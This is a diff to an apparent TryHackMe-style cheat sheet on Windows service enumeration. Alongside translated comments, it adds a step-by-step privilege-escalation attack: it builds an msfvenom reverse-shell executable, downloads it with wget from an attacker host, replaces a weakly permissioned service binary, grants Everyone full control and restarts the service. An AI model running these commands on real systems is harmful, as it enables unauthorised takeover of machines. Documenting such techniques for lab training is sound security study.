@@ -112,12 +112,12 @@ https://github.com/PwnDexter/SharpEDRChecker
 ## Windows-Applications/Services-Enumeration ✅
 ```cmd
 net start # لیست کردن سرویس‌های فعال در سیستم
-wmic service where "name like 'THM Demo'" get Name,PathName #  پیدا کردن مسیر فایل اجرایی سرویس خاص
+wmic service where "name like 'THM Demo'" get Name,PathName #  Find the path of the specific service executable file
 Get-Process -Name thm-demo # Checking Process activities associated with this service
 # Note: Process ID (PID) This is useful for the next steps.
 
-wmic product get name,version,vendor # چک کردن لیست همه‌ی نرم‌افزارهای نصب‌شده همراه با نسخه‌شون
-wmic service get name,displayname,pathname,startmode # Unquoted Service Path
+wmic product get name,version,vendor # Checking the list of all installed software with their version
+wmic service get name,displayname,pathname,startmode # Check (name, display name, executable file path and how to start) a list of all the services in the system 
 
 tasklist  # List of active processing
 tasklist | findstr <PID> # List of uniq active processing
@@ -125,9 +125,24 @@ wmic process list full  # View all the details of the processing
 
 Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
 
-
 sc queryex type=service # List of all running services
-sc qc WindowsScheduler # Check the configuration details of a particular service
+----------------------------------------------------------------
+# Attacking services that have poor executive permits
+sc qc WindowsScheduler # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe # We check the executable file of this service has Weak permission or not
+
+# Practical Attack: Replace the service executable file
+1️⃣ Making a malicious Payload with MSFvenom:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
+2️⃣ Transfer of malicious file to the victim system:
+wget http://10.11.99.141:8000/rev-svc.exe -O rev-svc.exe
+3️⃣ Replace the service executable file:
+move C:\Users\thm-unpriv\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe
+4️⃣ Giving all users permission:
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe /grant Everyone:F
+5️⃣ start service and get access:
+sc stop windowsscheduler
+sc start windowsscheduler
 
 ----------------------------------------------------------------
 # Check services through the Windows Registry
